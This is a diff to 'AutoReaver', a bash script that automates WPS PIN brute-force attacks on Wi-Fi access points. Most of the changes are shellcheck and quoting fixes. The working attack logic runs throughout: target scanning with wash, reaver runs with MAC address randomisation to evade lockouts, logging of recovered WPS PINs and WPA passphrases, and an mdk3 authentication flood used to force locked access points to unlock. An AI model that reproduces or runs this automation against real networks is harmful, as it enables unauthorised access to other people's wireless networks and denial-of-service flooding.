@@ -37,7 +37,10 @@ if [ $EUID -ne 0 ]; then
 	exit;
 fi
 
-source $(pwd)'/configurationSettings';
+# shellcheck disable=SC1090
+source "$(pwd)/configurationSettings";
+# shellcheck disable=SC1090
+source "$(pwd)/splash";
 
 ###########################################################################################################################
 ###################################################### FUNCTIONS ##########################################################
@@ -63,48 +66,55 @@ echoGreen(){
         echo "$(tput setaf 34)${1}$(tput sgr0)";
 }
 
-setDeviceSettings(){
-        if [[ ! -d "$PATH_IEEE" || ! "$(ls -A $PATH_IEEE)" ]]; then
-                echoWhite "---------------------------";
-                echoRed "No WIFI Devices Detected!!!";
-                echoWhite "---------------------------" && echo "";
-		exitAutoReaver;
-	fi
+Menu(){
+	local MENU_OUTPUT;
+	#$(echo $AP_BSSID | sed s/://g);
+}
 
+setDeviceSettings(){
 	local COUNTDEV=0;
-	local STR;
 	local DRIVER;
 	local LOGICAL;
+	local PHYSICAL;
 	local PHY;
 	local WIFICHOICE
 
-	if [[ -f $DEVICE_LIST_FILE ]]; then
-		$(rm $DEVICE_LIST_FILE)
+	if [[ ! -d "$PATH_IEEE" || ! "$(ls -A "$PATH_IEEE")" ]]; then
+		echoWhite "---------------------------";
+		echoRed "No WIFI Devices Detected!!!";
+		echoWhite "---------------------------" && echo "";
+		exitAutoReaver;
 	fi
 
-	touch $DEVICE_LIST_FILE;
+	# shellcheck disable=SC2091
+	if [[ -f $DEVICE_LIST_FILE ]]; then $(rm "$DEVICE_LIST_FILE"); fi;
+
+	touch "$DEVICE_LIST_FILE";
 
 	echoBlue "#		Physical	Device          Driver";
-	echoWhite "-----------------------------------------------------------"
+	echoWhite "-----------------------------------------------------------";
 
-	for PHY in $(ls $PATH_IEEE); do
+	for PHY in "$PATH_IEEE"*; do
 		COUNTDEV=$((COUNTDEV+1));
-	        STR=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER);
-	        DRIVER=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER | cut -c 5-${#STR});
-	        LOGICAL=$(ls $PATH_IEEE"$PHY"$PATH_DEVICE);
-	        echoBlue "$COUNTDEV		$PHY		$LOGICAL        $DRIVER";
-		echo "$PHY $LOGICAL $DRIVER" >> $DEVICE_LIST_FILE;
+		PHYSICAL=$(echo "$PHY" | cut -c $((${#PATH_IEEE}+1))-${#PHY});
+	        LOGICAL=$(ls "$PHY""$PATH_DEVICE");
+		DRIVER=$(ls "$PHY""$PATH_DRIVER");
+		# shellcheck disable=SC2012
+		DRIVER=$(ls "$PHY""$PATH_DRIVER" | cut -c 5-${#DRIVER});
+	        echoBlue "$COUNTDEV		$PHYSICAL		$LOGICAL        $DRIVER";
+		echo "$PHYSICAL $LOGICAL $DRIVER" >> "$DEVICE_LIST_FILE";
 	done
 
 	echo"";
 
 	while true; do
+		# shellcheck disable=SC2162
 	        read -p "Choose WIFI Device: " WIFICHOICE;
 
 		if [[ $WIFICHOICE -le $COUNTDEV && $WIFICHOICE -ge 1 ]]; then
-			WIFI_CARD_DRIVER=$(sed -n "$((WIFICHOICE))p" $DEVICE_LIST_FILE | awk '{ print $3 }');
-			WIFI_CARD_LOGICAL=$(sed -n "$((WIFICHOICE))p" $DEVICE_LIST_FILE | awk '{ print $2 }');
-			WIFI_CARD_PHY=$(sed -n "$(($WIFICHOICE))p" $DEVICE_LIST_FILE | awk '{ print $1 }');
+			WIFI_CARD_DRIVER=$(sed -n "$((WIFICHOICE))p" "$DEVICE_LIST_FILE" | awk '{ print $3 }');
+			WIFI_CARD_LOGICAL=$(sed -n "$((WIFICHOICE))p" "$DEVICE_LIST_FILE" | awk '{ print $2 }');
+			WIFI_CARD_PHY=$(sed -n "$((WIFICHOICE))p" "$DEVICE_LIST_FILE" | awk '{ print $1 }');
 			break;
 		fi
 
@@ -115,27 +125,20 @@ setDeviceSettings(){
 
 	getMonitorName;
 
-	if [ ! -z $WIFI_CARD_MONITOR  ]; then
-		stopMonitor;
-	fi
-
-	sleep 1;
+	if [ -n "$WIFI_CARD_MONITOR"  ]; then stopMonitor; fi && sleep 1;
 }
 
 setAPSettings(){
 	local WASH_OUTPUT;
-	local AP;
 	local APCHOICE;
 	local YN;
 	local SCANTIME;
 	local CMD_WASH;
-	local RESCAN_AP;
-	local WASH_SCAN;
 	local COUNTAP=0;
 
 	if [[ -f $WASH_LIST_FILE && $RESCAN_AP -eq 0 ]]; then
 		while true; do
-
+			# shellcheck disable=SC2162
 			read -p "Use Last WASH Scan (Y/N)?" YN && echo "";
 
 			case $YN in
@@ -153,11 +156,13 @@ setAPSettings(){
 
 	if [[ $WASH_SCAN -eq 1 ]]; then
 		while true; do
+			# shellcheck disable=SC2162
 			read -p "AP Scan Time Set to $WASH_TIME Sec. (Y/N)? " YN;
 
 			case $YN in
 				[Nn]* )
 					while true; do
+						# shellcheck disable=SC2162
 						read -p "Set New Scan Time [Current $WASH_TIME Sec.], (1-120): " SCANTIME
 
 						if [[ $SCANTIME -ge 1 && $SCANTIME -le 120 ]]; then
@@ -165,7 +170,8 @@ setAPSettings(){
 							break;
 						fi
 					done
-					;;
+
+					break;;
 				[Yy]* )
 					break;;
 			esac
@@ -173,19 +179,20 @@ setAPSettings(){
 			echoOrange "Invalid Selection......";
 		done
 
-		echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR;
+		echoBlue "Scanning APs for $WASH_TIME""s on $WIFI_CARD_MONITOR";
 		echoBlue "Please Wait...";
 		echo "";
 
 		CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $WASH_LIST_FILE";
-		eval $CMD_WASH >>/dev/null;
+		eval "$CMD_WASH" >>/dev/null;
 	fi
 
-	if [ $(awk 'END {print NR}' $WASH_LIST_FILE) -eq 2 ]; then
+	if [ "$(awk 'END {print NR}' "$WASH_LIST_FILE")" -eq 2 ]; then
 		echoRed "No Targets in AP List...";
 		echoBlue "Try Increase WASH Scan Time...";
 
 		while true; do
+			# shellcheck disable=SC2162
 			read -p "ReScan APs (Y/N)? " YN;
 
 			case $YN in
@@ -209,9 +216,9 @@ setAPSettings(){
 			2)
 				echoWhite "$WASH_OUTPUT";;
 			*)
-				if [[ $(awk '{ print $5 }' <<< $WASH_OUTPUT) == "Yes" ]]; then
+				if [[ $(awk '{ print $5 }' <<< "$WASH_OUTPUT") == "Yes" ]]; then
 					echoRed "$((COUNTAP-2))	$WASH_OUTPUT";
-				elif [[ $(awk '{ print $4 }' <<< $WASH_OUTPUT) == "2.0" ]]; then
+				elif [[ $(awk '{ print $4 }' <<< "$WASH_OUTPUT") == "2.0" ]]; then
 					echoOrange "$((COUNTAP-2))	$WASH_OUTPUT";
 				else
 					echoGreen "$((COUNTAP-2))	$WASH_OUTPUT";
@@ -220,7 +227,8 @@ setAPSettings(){
 	done < "$WASH_LIST_FILE" && echo "";
 
 	while true; do
-		read -p "Choose AP (1-$(($COUNTAP-2))), (0) to All, (R)escan : " APCHOICE;
+		# shellcheck disable=SC2162
+		read -p "Choose AP (1-$((COUNTAP-2))), (0) to All, (R)escan : " APCHOICE;
 
 		case $APCHOICE in
 			[Rr]* )
@@ -232,12 +240,13 @@ setAPSettings(){
 			0)
 				echoRed "All... is Currently Unavailable. Please Select Single Target.";;
 			*)
-				if [[ $APCHOICE -le $(($COUNTAP-2)) && $APCHOICE -ge 1 ]]; then
-					AP_BSSID=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $1 }');
-					AP_CHANNEL=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $2 }');
-					AP_ESSID=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $7 }');
-					AP_WPS=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $4 }');
-					AP_LOCK=$(sed -n "$((APCHOICE+2))p" $WASH_LIST_FILE | awk '{ print $5 }');
+				if [[ $APCHOICE -le $((COUNTAP-2)) && $APCHOICE -ge 1 ]]; then
+					AP_BSSID=$(sed -n "$((APCHOICE+2))p" "$WASH_LIST_FILE" | awk '{ print $1 }');
+					AP_CHANNEL=$(sed -n "$((APCHOICE+2))p" "$WASH_LIST_FILE" | awk '{ print $2 }');
+#					echo $(sed -n "$((APCHOICE+2))p" "$WASH_LIST_FILE" | awk 'END{ print NF }')
+					AP_ESSID=$(sed -n "$((APCHOICE+2))p" "$WASH_LIST_FILE" | awk '{ print $7 }');
+					AP_WPS=$(sed -n "$((APCHOICE+2))p" "$WASH_LIST_FILE" | awk '{ print $4 }');
+					AP_LOCK=$(sed -n "$((APCHOICE+2))p" "$WASH_LIST_FILE" | awk '{ print $5 }');
 					break;
 				fi
 		esac
@@ -245,7 +254,8 @@ setAPSettings(){
 		echoOrange "Invalid Selection......";
 	done
 
-#	RESCAN_AP=0;
+	RESCAN_AP=0;
+	WASH_SCAN=1;
 }
 
 setAutoReaverOpt(){
@@ -254,12 +264,14 @@ setAutoReaverOpt(){
 	local ATTEMPT;
 
 	while true; do
+		# shellcheck disable=SC2162
         	read -p "Use $FAKE_AUTH_DELAY_SECONDS Sec AIREPLAY-NG Fake Authentication Delay (Y/N)? " YN;
 
 		case $YN in
 			[Yy]* )
 				break;;
 			[Nn]* )
+				# shellcheck disable=SC2162
 				read -p "Please Enter New Fake Authentication Value: " SEC;
 
 				if [[ $SEC -lt 61 && $SEC -gt 0 ]]; then
@@ -273,15 +285,17 @@ setAutoReaverOpt(){
 	done
 
         while true; do
+		# shellcheck disable=SC2162
                 read -p "Use $REAVER_PIN_ATTEMPTS PIN Attempts Before Changin MAC (Y/N)? " YN;
 
                 case $YN in
                         [Yy]* )
                                 break;;
                         [Nn]* )
+				# shellcheck disable=SC2162
                                 read -p "Please Enter PIN Attempts: " ATTEMPT;
 
-                                if [ $ATTEMPT -gt 0 ]; then
+                                if [ "$ATTEMPT" -gt 0 ]; then
                                         REAVER_PIN_ATTEMPTS=$ATTEMPT;
                                         break;
                                 else
@@ -292,15 +306,17 @@ setAutoReaverOpt(){
         done
 
         while true; do
+		# shellcheck disable=SC2162
                 read -p "Use $REAVER_ATTEMPT_DELAY Sec Delay Between Reaver PIN Attempt (Y/N)? " YN;
 
                 case $YN in
                         [Yy]* )
                                 break;;
                         [Nn]* )
+				# shellcheck disable=SC2162
                                 read -p "Please Enter New Attempt Delay Value: " SEC;
 
-                                if [ $SEC -gt 0 ]; then
+                                if [ "$SEC" -gt 0 ]; then
                                         REAVER_ATTEMPT_DELAY=$SEC;
                                         break;
                                 else
@@ -319,6 +335,7 @@ setAutoReaverOpt(){
 		echoWhite "-t 15: Set the receive timeout period";
 		echoWhite "--win7: Mimic a Windows 7 registrar";
 
+		# shellcheck disable=SC2162
                 read -p "(Y/N)? " YN;
 
                 case $YN in
@@ -344,38 +361,40 @@ setAPStatus(){
 	CHECK_AP_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.APStatus';
 
 	if [[ -f $CHECK_AP_STATUS ]]; then
-		if [[ "$(cat $CHECK_AP_STATUS | awk --field-separator='_' '{ print $5 }')" != "$AP_CHANNEL" && "$(cat $CHECK_AP_STATUS | awk --field-separator='_' '{ print $4 }')" != "NOT-FOUND" ]]; then
-			AP_CHANNEL="$(cat $CHECK_AP_STATUS | awk --field-separator='_' '{ print $5 }')";
+		# shellcheck disable=SC2002
+		if [[ "$(cat "$CHECK_AP_STATUS" | awk --field-separator='_' '{ print $5 }')" != "$AP_CHANNEL" && "$(cat "$CHECK_AP_STATUS" | awk --field-separator='_' '{ print $4 }')" != "NOT-FOUND" ]]; then
+			AP_CHANNEL="$(cat "$CHECK_AP_STATUS" | awk --field-separator='_' '{ print $5 }')";
 			echoGreen "AP Channel Changed To $AP_CHANNEL......";
 		fi
 
-		case "$(cat $CHECK_AP_STATUS | awk --field-separator='_' '{ print $4 }')" in
+		# shellcheck disable=SC2002
+		case "$(cat "$CHECK_AP_STATUS" | awk --field-separator='_' '{ print $4 }')" in
 			"LOCKED")
 				AP_LOCK="Yes";
 				echoRed "AP Is Locked......";
-				echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_AP_STATUS)") >> $STATUS_FILE;
-				$(rm $CHECK_AP_STATUS);;
+				date +"%d/%m/%Y %H:%M:%S $(cat "$CHECK_AP_STATUS")" >> "$STATUS_FILE";
+				rm "$CHECK_AP_STATUS";;
 			"UNLOCKED")
-				if [[ $(awk 'END {print $3}' $STATUS_FILE | grep -ic 'UNLOCKED') -eq 0 ]]; then
+				if [[ $(awk 'END {print $3}' "$STATUS_FILE" | grep -ic 'UNLOCKED') -eq 0 ]]; then
 					echoGreen "AP Is Not Locked......";
-					echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_AP_STATUS)") >> $STATUS_FILE;
+					date +"%d/%m/%Y %H:%M:%S $(cat "$CHECK_AP_STATUS")" >> "$STATUS_FILE";
 				else
-					$(rm $CHECK_AP_STATUS);
+					rm "$CHECK_AP_STATUS";
 				fi
 
 				AP_LOCK="No";;
 			"NOT-FOUND")
 				AP_LOCK="NULL";
 
-				if [[ $(awk 'END {print $3}' $STATUS_FILE | grep -ic 'NOT-FOUND') -eq 0 ]]; then
+				if [[ $(awk 'END {print $3}' "$STATUS_FILE" | grep -ic 'NOT-FOUND') -eq 0 ]]; then
 					WASH_ATTEMPT=1;
 				else
-					WASH_ATTEMPT=$(($(awk 'END {print $3}' $STATUS_FILE | awk --field-separator='_' '{ print $5 }')+1));
+					WASH_ATTEMPT=$(($(awk 'END {print $3}' "$STATUS_FILE" | awk --field-separator='_' '{ print $5 }')+1));
 				fi
 
-				 if [[ $WASH_ATTEMPT -le $MAX_WASH_ATTEMPT ]]; then
+				if [[ $WASH_ATTEMPT -le $MAX_WASH_ATTEMPT ]]; then
 					echoOrange "AP Not Found......";
-					echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_AP_STATUS)_$WASH_ATTEMPT") >> $STATUS_FILE;
+					date +"%d/%m/%Y %H:%M:%S $(cat "$CHECK_AP_STATUS")_$WASH_ATTEMPT" >> "$STATUS_FILE";
 					checkAPStatus;
 				else
 					echoRed "AP Not Found......";
@@ -395,23 +414,21 @@ checkAPStatus(){
 
 	CHECK_AP_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.APStatus';
 
-	if [[ ! -f $CHECK_AP_STATUS ]]; then
-		touch $CHECK_AP_STATUS;
-	fi
+	if [[ ! -f $CHECK_AP_STATUS ]]; then touch "$CHECK_AP_STATUS"; fi;
 
 	CMD_LOCK_STATUS="timeout --preserve-status $WASH_TIMEOUT wash -i $WIFI_CARD_MONITOR";
-	eval $CMD_LOCK_STATUS | {
+	eval "$CMD_LOCK_STATUS" | {
 		while read -r WASH_OUTPUT; do
 			if [[ $(echo "$WASH_OUTPUT" | grep -ic "$AP_BSSID") -eq 1 ]]; then
-				if [[ "$(awk '{ print $5 }' <<< $WASH_OUTPUT)" == "Yes" ]]; then
-					echo "AP_CHECK_STATUS_LOCKED_$(awk '{ print $2 }' <<< $WASH_OUTPUT)" > $CHECK_AP_STATUS;
+				if [[ "$(awk '{ print $5 }' <<< "$WASH_OUTPUT")" == "Yes" ]]; then
+					echo "AP_CHECK_STATUS_LOCKED_$(awk '{ print $2 }' <<< "$WASH_OUTPUT")" > "$CHECK_AP_STATUS";
 				else
-					echo "AP_CHECK_STATUS_UNLOCKED_$(awk '{ print $2 }' <<< $WASH_OUTPUT)" > $CHECK_AP_STATUS;
+					echo "AP_CHECK_STATUS_UNLOCKED_$(awk '{ print $2 }' <<< "$WASH_OUTPUT")" > "$CHECK_AP_STATUS";
 				fi
 
 				break;
 			else
-				echo "AP_CHECK_STATUS_NOT-FOUND" > $CHECK_AP_STATUS;
+				echo "AP_CHECK_STATUS_NOT-FOUND" > "$CHECK_AP_STATUS";
 			fi
 		done
 	}
@@ -430,9 +447,9 @@ unlockAP(){
 	echoOrange "Trying To Unlock AP......";
 
 	CMD_MDK3="mdk3 $WIFI_CARD_MONITOR  a -a $AP_BSSID -m";
-	eval $CMD_MDK3 | {
+	eval "$CMD_MDK3" | {
 		while true; do
-			COUNT_LOOPS=$((COUNT_LOOPS+$MAX_CLIENTS_BREAK));
+			COUNT_LOOPS=$((COUNT_LOOPS+MAX_CLIENTS_BREAK));
 
 			if [[ $COUNT_LOOPS -lt $MAX_CLIENTS ]]; then
 				if [[ -z "$LOOP_TARGET" ]]; then
@@ -444,7 +461,7 @@ unlockAP(){
 				LOOP_TARGET="$COUNT_LOOPS" && break;
 			else
 				if [[ $COUNT_LOOPS -ge $MAX_CLIENTS ]]; then
-					LOOP_TARGET="$LOOP_TARGET,$(($COUNT_LOOPS-($COUNT_LOOPS-$MAX_CLIENTS)))";
+					LOOP_TARGET="$LOOP_TARGET,$((COUNT_LOOPS-(COUNT_LOOPS-MAX_CLIENTS)))";
 					break;
 				fi
 			fi
@@ -457,14 +474,12 @@ unlockAP(){
 
 				if [[ $COUNT -le $(echo $LOOP_TARGET | awk --field-separator="," "{ print NF }") ]]; then
 					if [[ $CLIENT_COUNT -eq $(echo $LOOP_TARGET | cut -d, -f$COUNT) ]]; then
-						echo $(date +"%d/%m/%Y %H:%M:%S MDK3_FLOOD_ATTACK_$(echo $LOOP_TARGET | cut -d, -f$COUNT)") >> $STATUS_FILE;
+						date +"%d/%m/%Y %H:%M:%S MDK3_FLOOD_ATTACK_$(echo "$LOOP_TARGET" | cut -d, -f$COUNT)" >> "$STATUS_FILE";
 						checkAPStatus;
 
-						if [[ "$AP_LOCK" == "No" || "$AP_LOCK" == "NULL" ]]; then
-							break;
-						fi
+						if [[ "$AP_LOCK" == "No" || "$AP_LOCK" == "NULL" ]]; then break; fi;
 
-						COUNT=$(($COUNT+1));
+						COUNT=$((COUNT+1));
 					fi
 				else
 					break;
@@ -472,25 +487,26 @@ unlockAP(){
 			fi
 		done
 
-		$(killall -I mdk3);
+		killall -I mdk3;
 	}
 
 	setAPStatus;
 }
 
-getRandomMac(){
+RandomMac(){
 	sleep 1;
 
-	ifconfig $WIFI_CARD_LOGICAL down;
+	ifconfig "$WIFI_CARD_LOGICAL" down;
 	echoBlue "Changing $WIFI_CARD_LOGICAL MAC......";
-	WIFI_CARD_RNDMAC=$(macchanger -r $1 $WIFI_CARD_LOGICAL | awk '{ print $3 }' <<< "$(grep -Ei 'new.*mac:')")
-	ifconfig $WIFI_CARD_LOGICAL up;
+#	WIFI_CARD_RNDMAC=$(macchanger -r "$1" "$WIFI_CARD_LOGICAL" | awk '{ print $3 }' <<< "$(grep -Ei 'new.*mac:')");
+	WIFI_CARD_RNDMAC=$(macchanger -r "$WIFI_CARD_LOGICAL" | awk '{ print $3 }' <<< "$(grep -Ei 'new.*mac:')");
+	ifconfig "$WIFI_CARD_LOGICAL" up;
 	echoGreen "$WIFI_CARD_LOGICAL New MAC Address $WIFI_CARD_RNDMAC......";
 }
 
 resetDeviceDriver(){
 	echoBlue "Reseting Device Driver ($WIFI_CARD_DRIVER)......";
-	modprobe -r $WIFI_CARD_DRIVER && modprobe $WIFI_CARD_DRIVER
+	modprobe -r "$WIFI_CARD_DRIVER" && modprobe "$WIFI_CARD_DRIVER";
 
 	sleep 1;
 
@@ -513,7 +529,7 @@ startMonitor(){
 
 	if [[ $(airmon-ng check | grep -ic "pid") -gt 0 ]]; then
 		CMD_KILL="airmon-ng check kill";
-		eval $CMD_KILL >>/dev/null;
+		eval "$CMD_KILL" >>/dev/null;
 		echoGreen "Processes Killed......";
 	else
 		echoBlue "No Processes to Kill......";
@@ -532,20 +548,18 @@ startMonitor(){
 	echoBlue "$MESSAGE";
 
 	CMD_START="airmon-ng start $WIFI_CARD_LOGICAL $AP_CHANNEL";
-	eval $CMD_START >>/dev/null && getMonitorName && checkIEEEPaths;
+	eval "$CMD_START" >>/dev/null && getMonitorName && checkIEEEPaths;
 }
 
 stopMonitor(){
 	local CMD_STOP;
 
-	if [ -z "$WIFI_CARD_MONITOR" ]; then
-		getMonitorName;
-	fi
+	if [ -z "$WIFI_CARD_MONITOR" ]; then getMonitorName; fi;
 
-	if [ ! -z "$WIFI_CARD_MONITOR" ]; then
+	if [ -n "$WIFI_CARD_MONITOR" ]; then
 		echoBlue "Stopping Monitor Mode On $WIFI_CARD_LOGICAL......";
-		CMD_STOP="airmon-ng stop $WIFI_CARD_MONITOR | cut -b ${str%%$WIF_CARD_LOGICAL*}-$((${#WIFICARD_LOGICAL}+3))";
-		eval $CMD_STOP >>/dev/null && WIFI_CARD_MONITOR="" && checkIEEEPaths;
+		CMD_STOP="airmon-ng stop $WIFI_CARD_MONITOR"; ### CMD_STOP="airmon-ng stop $WIFI_CARD_MONITOR | cut -b ${str%%$WIFI_CARD_LOGICAL*}-$((${#WIFI_CARD_LOGICAL}+3))"
+		eval "$CMD_STOP" >>/dev/null && WIFI_CARD_MONITOR="" && checkIEEEPaths;
 	fi
 }
 
@@ -556,8 +570,9 @@ checkIEEEPaths(){
 
 	LOGICAL=$(echo "$WIFI_CARD_LOGICAL" | cut -c 1-5);
 
-	for PHY in $(ls $PATH_IEEE); do
-		PHYSICAL=$(ls "$PATH_IEEE$PHY$PATH_DEVICE" | cut -c 1-5);
+	for PHY in "$PATH_IEEE"*; do
+		# shellcheck disable=SC2012
+		PHYSICAL=$(ls "$PHY""$PATH_DEVICE" | cut -c 1-5);
 
 		if [ "$PHYSICAL" == "$LOGICAL" ]; then
 			WIFI_CARD_PHY=$PHY;
@@ -589,23 +604,23 @@ checkRequisites(){
 	for (( i=0; i<${#ARR_REQUISITES[@]}; i++ )); do
 		CMD_COMMAND=$(command -v "${ARR_REQUISITES[$i]}");
 
-		if [ -z "$CMD_COMMAND" ]; then
-			MISS_REQUISITES[${#MISS_REQUISITES[@]}]="${ARR_REQUISITES[$i]}";
-		fi
+		if [ -z "$CMD_COMMAND" ]; then MISS_REQUISITES[${#MISS_REQUISITES[@]}]="${ARR_REQUISITES[$i]}"; fi;
 	done
 
 	unset ARR_REQUISITES;
 
 	if [ ${#MISS_REQUISITES[@]} -gt 0 ]; then
+		# shellcheck disable=SC2124
 		MISSING="${MISS_REQUISITES[@]}";
 		echoRed "Following Requisites, $MISSING, are Missing......";
 
 		while true; do
+			# shellcheck disable=SC2162
 			read -p "Do You Want to Try to Install Missing Requisites (Y/N)? " YN;
 
 			case $YN in
 				[Yy]* )
-					case "$(curl -s --max-time 2 -I $HTTP_CONN | sed 's/^[^ ]*  *\([0-9]\).*/\1/; 1q')" in
+					case "$(curl -s --max-time 2 -I "$HTTP_CONN" | sed 's/^[^ ]*  *\([0-9]\).*/\1/; 1q')" in
 						[23]* )
 							echoGreen "HTTP Connectivity is up......";
 
@@ -613,8 +628,9 @@ checkRequisites(){
 								echoBlue "Installing ${MISS_REQUISITES[$i]}......"
 
 								CMD_COMMAND="sudo apt-get install ${MISS_REQUISITES[$i]} -y";
-								eval $CMD_COMMAND;
+								eval "$CMD_COMMAND";
 
+								# shellcheck disable=SC2181
 								if [[ $? -gt 0 ]]; then
 									echoRed "${MISS_REQUISITES[$i]} Failed to Install, Exiting......";
 									exitAutoReaver;
@@ -641,28 +657,20 @@ checkRequisites(){
 		done
 	else
 		echoGreen "All Requisites are Installed......";
-		sleep 3;
+		sleep 2;
 	fi
 
 	unset MISS_REQUISITES;
 }
 
 exitAutoReaver(){
-	echoBlue "Exiting AutoReaver......";
-
 	local netManagerStatus;
 
-        if [ -z "$WIFI_CARD_MONITOR" ]; then
-                getMonitorName;
-        fi
+	echoBlue "Exiting AutoReaver......";
 
-        if [ ! -z "$WIFI_CARD_MONITOR" ]; then
-		stopMonitor
-        fi
-
-	if [ ! -z "$WIFI_CARD_DRIVER" ]; then
-		resetDeviceDriver;
-	fi
+        if [ -z "$WIFI_CARD_MONITOR" ]; then getMonitorName; fi;
+        if [ -n "$WIFI_CARD_MONITOR" ]; then stopMonitor; fi;
+	if [ -n "$WIFI_CARD_DRIVER" ]; then resetDeviceDriver; fi;
 
 	netManagerStatus=$(systemctl status NetworkManager | awk '{ print $2 }' <<< "$(grep -Ei 'Active:')");
 
@@ -723,6 +731,7 @@ autoReaver(){
 		echo "";
 
 		while true; do
+			# shellcheck disable=SC2162
 			read -p "Proceed (Y/N)?" yn;
 
 			case $yn in
@@ -737,29 +746,28 @@ autoReaver(){
 			esac
 		done
 
-		if [[ $PROCEED -eq 1 ]]; then
-			PROCEED=0;
-			break;
-		fi
+		if [[ $PROCEED -eq 1 ]]; then break; fi;
 	done
 
 	clear;
 
-	stopMonitor && resetDeviceDriver && getRandomMac &&  startMonitor;
+	stopMonitor && resetDeviceDriver && RandomMac &&  startMonitor;
 
-	BSSID_CLEAR=$(echo $AP_BSSID | sed s/://g);
+	# shellcheck disable=SC2001
+	BSSID_CLEAR=$(echo "$AP_BSSID" | sed s/://g);
 	SESSION_FILE=$REAVER_SESSION_DIR'/'$BSSID_CLEAR'.session';
 	STATUS_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.status'
+	echo "BSSID: $AP_BSSID CHANNEL: $AP_CHANNEL ESSID: $AP_ESSID" >> "$STATUS_FILE"
 
 	if [[ ! -f $STATUS_FILE ]]; then
-		touch $STATUS_FILE;
+		touch "$STATUS_FILE";
 		echoGreen "Status File for $AP_BSSID Created......";
 	else
 		echoBlue "Status File for $AP_BSSID Found......";
 	fi
 
 	if [[ ! -f $CRACKED_LIST_FILE ]]; then
-		touch $CRACKED_LIST_FILE;
+		touch "$CRACKED_LIST_FILE";
 		echoGreen "Cracked List File Created......";
 	else
 		echoBlue "Cracked List File Found......";
@@ -771,87 +779,81 @@ autoReaver(){
 		#CMD_FAUTH="konsole --background-mode -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR'";
 		CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";
 
-		eval $CMD_REAVER | {
+		eval "$CMD_REAVER" | {
 			while read -r REAVER_OUTPUT; do
 
 				if [[ $(echo "$REAVER_OUTPUT" | grep -ic "detected ap rate limiting") -gt 0 ]]; then
 					echoRed "$REAVER_OUTPUT";
-					echo $(date +"%d/%m/%Y %H:%M:%S AP_RATE_LIMITING") >> $STATUS_FILE
-					$(killall -I reaver);
+					date +"%d/%m/%Y %H:%M:%S AP_RATE_LIMITING" >> "$STATUS_FILE"
+					killall -I reaver;
 				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps pin") -gt 0 ]]; then
 					echoGreen "$REAVER_OUTPUT";
-					echo $(date +"%d/%m/%Y %H:%M:%S WPS_PIN_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
+					date +"%d/%m/%Y %H:%M:%S WPS_PIN_FOUND $(awk '{ print $4 }' <<< "$REAVER_OUTPUT")" >> "$STATUS_FILE";
 				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wpa psk") -gt 0 ]]; then
 					echoGreen "$REAVER_OUTPUT";
-					echo $(date +"%d/%m/%Y %H:%M:%S WPA_PSK_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
+					date +"%d/%m/%Y %H:%M:%S WPA_PSK_FOUND $(awk '{ print $4 }' <<< "$REAVER_OUTPUT")" >> "$STATUS_FILE";
 				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "failed to recover wpa key") -gt 0 ]]; then
 					echoRed "$REAVER_OUTPUT";
-					echo $(date +"%d/%m/%Y %H:%M:%S FAILED_TO_RECOVER_WPA_KEY") >> $STATUS_FILE;
+					date +"%d/%m/%Y %H:%M:%S FAILED_TO_RECOVER_WPA_KEY" >> "$STATUS_FILE";
 				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "receive timeout occurred") -gt 0 ]]; then
 					echoOrange "$REAVER_OUTPUT";
-					echo $(date +"%d/%m/%Y %H:%M:%S RECEIVE_TIMEOUT") >> $STATUS_FILE;
-					$(killall -I reaver);
+					date +"%d/%m/%Y %H:%M:%S RECEIVE_TIMEOUT" >> "$STATUS_FILE";
+					killall -I reaver;
 				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "restored previous session") -gt 0 ]]; then
 					echoGreen "$REAVER_OUTPUT";
 				elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps transaction failed") -gt 0 ]]; then
-									echoOrange "$REAVER_OUTPUT";
-					echo $(date +"%d/%m/%Y %H:%M:%S WPS_TRANSACTION_FAILED") >> $STATUS_FILE;
+					echoOrange "$REAVER_OUTPUT";
+					date +"%d/%m/%Y %H:%M:%S WPS_TRANSACTION_FAILED" >> "$STATUS_FILE";
 				elif [[ $(echo "$REAVER_OUTPUT" | grep -icw "[!]") -eq 1 || $(echo "$REAVER_OUTPUT" | grep -icw "[-]") -gt 0 ]]; then
 					echoOrange "$REAVER_OUTPUT";
-					echo $(date +"%d/%m/%Y %H:%M:%S $REAVER_OUTPUT") >> $STATUS_FILE;
+					date +"%d/%m/%Y %H:%M:%S $REAVER_OUTPUT" >> "$STATUS_FILE";
 				else
 					echoBlue "$REAVER_OUTPUT";
 				fi
 			done
 		}
 
-		if [[ "$(awk 'END {print $3}' $STATUS_FILE)" == "AP_RATE_LIMITING" ]]; then
-			if [[ "$AP_LOCK" == "Yes" ]]; then
-				unlockAP;
+		if [[ "$(awk 'END {print $3}' "$STATUS_FILE")" == "AP_RATE_LIMITING" ]]; then
+			if [[ "$AP_LOCK" == "Yes" ]]; then unlockAP; fi;
 
